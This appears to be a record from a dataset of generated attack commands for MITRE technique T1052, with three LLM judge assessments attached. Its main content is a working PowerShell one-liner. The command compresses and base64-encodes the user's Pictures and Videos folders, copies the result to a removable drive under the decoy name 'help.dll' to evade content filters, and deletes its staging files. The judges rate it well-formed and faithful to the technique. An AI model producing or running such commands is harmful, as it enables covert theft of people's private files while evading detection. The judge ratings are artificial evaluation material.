command: $usb=(Get-Volume -DriveType Removable | Select -First 1 -ExpandProperty DriveLetter)+':\'; $zip="$env:TEMP\media.zip"; Compress-Archive -Path "$env:USERPROFILE\Pictures\*", "$env:USERPROFILE\Videos\*" -DestinationPath $zip -Force; $b64="$env:TEMP\media.enc"; [IO.File]::WriteAllText($b64,[Convert]::ToBase64String([IO.File]::ReadAllBytes($zip))); Copy-Item $b64 (Join-Path $usb 'help.dll') -Force; Remove-Item $zip,$b64 -Force
explanation: Compresses and base64-encodes media libraries, then writes the encoded file to the USB as a DLL-named decoy using Copy-Item to avoid simple content filters.
rationale_steps: Compress large directories to a single archive
Copy to USB under a misleading filename using Copy-Item

llm_judgments.syntactic_justification: Well-formed PowerShell with balanced quoting and valid constructs, though Get-Volume -DriveType may be an invalid parameter in many environments.
llm_judgments.semantic_justification: It stages by compressing and base64-encoding media and writes to a removable drive with a deceptive filename (aligning to T1052), but success depends on a potentially invalid -DriveType filter and the presence of a writable removable volume.

llm_judgments.syntactic_justification: The PowerShell command is perfectly well-formed with balanced parentheses, proper string interpolation, valid cmdlet names and parameters, correct semicolon separators, and no syntax errors.
llm_judgments.semantic_justification: The command fully implements T1052 by detecting a removable USB drive, staging and compressing Pictures/Videos directories, base64-encoding the archive to obfuscate content, copying it to the USB disguised as a DLL file to evade content filters, and cleaning up artifacts — all operationally plausible without elevated privileges on Windows.

llm_judgments.syntactic_justification: The command uses valid PowerShell syntax, correctly handles variables, utilizes proper .NET class calls, and employs correct pipe and semicolon separators.
llm_judgments.semantic_justification: The command accurately implements the staging, compression, obfuscation (Base64), and transfer to a removable drive as described in the MITRE T1052 technique.
